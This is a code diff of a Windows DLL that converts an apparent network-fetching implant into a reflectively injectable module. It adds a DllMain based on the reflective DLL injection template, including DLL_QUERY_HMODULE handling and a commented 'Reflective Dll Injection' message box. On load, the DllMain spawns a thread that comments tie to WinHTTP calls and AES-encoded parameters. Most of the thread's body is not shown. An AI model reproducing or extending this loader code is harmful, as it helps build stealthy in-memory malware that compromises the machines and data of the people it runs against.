@@ -2,46 +2,9 @@
 
 #define MAX_THREADS 3
 
+extern HINSTANCE hAppInstance;
+
 DWORD WINAPI ThreadProc(LPVOID lpParam);
- BOOL g_runFinished = FALSE;
-
-DLLEXPORT VOID Start()
-{
-    while (TRUE)
-    {
-        Sleep(24*60*60*1000);
-    }
-}
-
-DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
-{
-    HANDLE hThread = NULL;
-
-    switch (fdwReason)
-    {
-        case DLL_PROCESS_ATTACH:
-            // Execute the Run function within a new thread
-            // because WinHTTP functions are not usable in DllMain.
-            hThread = CreateThread(
-                NULL,
-                0,
-                ThreadProc,
-                hinstDLL,
-                0,
-                NULL
-            );
-            // WaitForSingleObject(hThread, INFINITE);
-            // CloseHandle(hThread);
-            break;
-        case DLL_THREAD_ATTACH:
-            break;
-        case DLL_THREAD_DETACH:
-            break;
-        case DLL_PROCESS_DETACH:
-            break;
-    }
-    return TRUE;
-}
 
 DWORD WINAPI ThreadProc(LPVOID lpParam)
 {
@@ -70,7 +33,40 @@ DWORD WINAPI ThreadProc(LPVOID lpParam)
         AES_IV_BASE64_W
     );
 
-    g_runFinished = TRUE;
-
     return 0;
+}
+
+DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    BOOL bReturnValue = TRUE;
+
+    HANDLE hThread = NULL;
+
+    switch (fdwReason)
+    {
+        case DLL_QUERY_HMODULE:
+            if(lpReserved)
+                *(HMODULE*)lpReserved = hAppInstance;
+            break;
+        case DLL_PROCESS_ATTACH:
+            hAppInstance = hinstDLL;
+            // MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
+
+            // Execute the Run function within a new thread
+            // because WinHTTP functions are not usable in DllMain.
+            hThread = CreateThread(
+                NULL,
+                0,
+                ThreadProc,
+                hinstDLL,
+                0,
+                NULL
+            );
+            break;
+        case DLL_PROCESS_DETACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return bReturnValue;
 }
